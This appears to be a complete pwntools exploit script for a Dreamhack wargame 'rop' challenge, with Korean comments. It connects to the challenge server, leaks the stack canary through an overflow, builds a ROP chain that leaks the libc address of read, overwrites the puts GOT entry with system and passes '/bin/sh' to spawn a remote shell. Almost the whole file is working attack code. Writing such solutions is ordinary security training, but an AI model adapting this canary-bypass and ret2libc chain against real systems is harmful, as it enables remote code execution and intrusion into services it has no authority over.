from pwn import *

# nc host2.dreamhack.games 19262
p = remote("host2.dreamhack.games", 19262)
# p = process("./rop")

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
e = ELF("./rop")

read_plt = e.plt["read"]
read_got = e.got["read"]

puts_plt = e.plt["puts"]
puts_got = e.got["puts"]

pr_gadget = 0x00000000004007f3 # pop rdi ; ret
ppr_gadget = 0x00000000004007f1 # pop rsi ; pop r15 ; ret

# puts_plt = 0x400570
# printf_plt = 0x400590
# read_plt = 0x4005a0

# puts_got = 0x601018
# printf_got = 0x601028
# read_got = 0x601030

# context.log_level = 'debug'

p.recvuntil("Buf: ")
pay_canary = b""
pay_canary += b"A" * 0x39
p.send(pay_canary)

p.recvuntil("A" * 0x38)
canary = u64(p.recv(8)) - ord('A')

# print(hex(canary))

p.recvuntil("Buf: ")

pay = b""
pay += b"A" * 0x38
pay += p64(canary)
pay += b"A" * 8
pay += p64(pr_gadget) # pop rdi ; ret, rdi -->  read_got
pay += p64(read_got)  # puts arr leak
pay += p64(puts_plt)

pay += p64(pr_gadget) 
pay += p64(0)       # pop rdi ; ret, rdi -->  0
pay += p64(ppr_gadget)
pay += p64(puts_got) # pop rsi ; pop r15 ; ret, rsi --> puts_got
pay += p64(0)        # pop r15 ; ret, r15 --> 0 
pay += p64(read_plt) # where rdx ?
# read --> sys_arr(8)+binsh

pay += p64(pr_gadget)
pay += p64(puts_got + 8) # pop rdi ; ret, rdi -->  puts_got + 8
pay += p64(puts_plt)

p.send(pay)

read_arr = u64(p.recv(6) + b"\x00\x00")  
print(hex(read_arr))
# 64bit에서 함수 주소는 보통 6바이트이기 때문에 (0x00007fffffffffff와 같은 형식) 
# 함수를 출력하면 6바이트만 출력될 것 (0x7fffffffffff). 
# 따라서 6바이트를 받고 앞에 \x00\x00을 붙여 8바이트로 만듦
libc_base = read_arr - 0x110140
sys_arr = libc_base + 0x04f550

p.send(p64(sys_arr) + b"/bin/sh\x00")

p.interactive()